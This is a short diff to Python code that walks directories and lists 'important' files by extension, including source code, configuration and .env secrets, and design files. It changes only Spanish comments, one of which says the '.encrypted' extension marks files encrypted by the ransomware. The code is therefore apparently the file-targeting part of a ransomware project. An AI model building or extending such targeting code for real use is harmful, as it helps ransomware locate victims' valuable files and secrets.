@@ -13,7 +13,7 @@ def is_important_file(file):
         'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
         'configuration_files': ['.ini', '.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
         'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
-        'encrypted_extension': ['.encrypted']
+        'encrypted_extension': ['.encrypted'] #extensión archivos cifrados por el ransomware
     }
     _, extension = os.path.splitext(file)
     return any(extension.lower() in ext_list for ext_list in extensions.values())
@@ -40,4 +40,4 @@ def walk_directory(directorio):
             if is_important_file(file):
                 important_files.append(os.path.join(root, file))  # Devuelve ruta absoluta
 
-    return important_files  # Solo devuelve la lista de archivos importantes
+    return important_files  # Devuelve una lista de los archivos importantes
